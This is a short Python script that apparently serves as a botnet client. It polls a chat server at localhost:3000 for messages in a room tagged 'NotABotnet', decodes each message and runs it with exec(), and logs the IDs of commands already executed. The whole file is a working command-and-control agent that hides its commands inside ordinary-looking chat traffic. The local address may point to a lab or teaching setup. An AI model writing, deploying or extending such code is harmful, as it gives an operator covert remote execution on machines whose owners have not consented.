import os
import urllib.request
import json
from encoder.encode import *

CHAT_MESSAGES_URL = "http://localhost:3000/messages"
TAG_FOR_COMMAND = "NotABotnet"
COMMAND_LIST_FILE = "commands.lst"


def get_messages():
    with urllib.request.urlopen(CHAT_MESSAGES_URL) as url:
        data = json.loads(url.read().decode())
        return data["messages"]


def get_list_of_run_commands():
    if not os.path.exists(COMMAND_LIST_FILE):
        f = open(COMMAND_LIST_FILE, 'w')
        f.close()

    return [int(l.replace('\n', '')) for l in open(COMMAND_LIST_FILE, 'r').readlines()]


def add_run_command_id(id_number):
    f = open(COMMAND_LIST_FILE, 'a')
    f.write(str(id_number) + "\n")


def filter_messages_by_tag(messages, tag):
    return [m for m in messages if m["room"] == tag]


for message in filter_messages_by_tag(get_messages(), TAG_FOR_COMMAND):
    if message['id'] not in get_list_of_run_commands():
        exec(decode(message['message'], message['time']))
        add_run_command_id(message['id'])
    else:
        print("Command " + str(message["id"]) + " Has Already Been Run")